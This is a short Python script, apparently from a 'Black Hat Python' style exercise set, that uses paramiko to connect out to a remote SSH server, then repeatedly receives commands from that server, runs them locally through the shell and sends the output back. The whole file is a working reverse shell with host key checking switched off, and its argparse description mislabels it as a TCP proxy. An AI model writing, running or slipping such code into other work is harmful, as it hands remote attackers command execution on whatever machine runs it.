import subprocess, argparse, paramiko, sys
sys.path.append('..')
from utils import utils

def process_options():
    global listen, port, execute, command, upload_dest, target, upload
    
    parser = argparse.ArgumentParser(description='BHP TCP Proxy Tool')
    parser.add_argument('host', type=str, help='host to connect to')
    parser.add_argument('port', action=utils.ConvertToInt, default=22, help='port to connect to')
    parser.add_argument('username', type=str, help='username to connect as')
    parser.add_argument('password', type=str, help='password for user')
    args = parser.parse_args()
    
    return (args.host, args.port, args.username, args.password)

def ssh_command(host, port, user, password):
    client = paramiko.SSHClient()
    # client.load_host_keys('~/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(host, port=port, username=user, password=password)
    
    ssh_session = client.get_transport().open_session()
    
    if ssh_session.active:
        print(str(ssh_session.recv(1024), 'utf8'))
        
        while True:
            command = ssh_session.recv(1024) # get the command from the ssh server
            
            try:
                cmd_output = subprocess.check_output(str(command, 'utf8'), shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

if __name__ == '__main__':
    host, port, username, password = process_options()
    ssh_command(host, port, username, password)
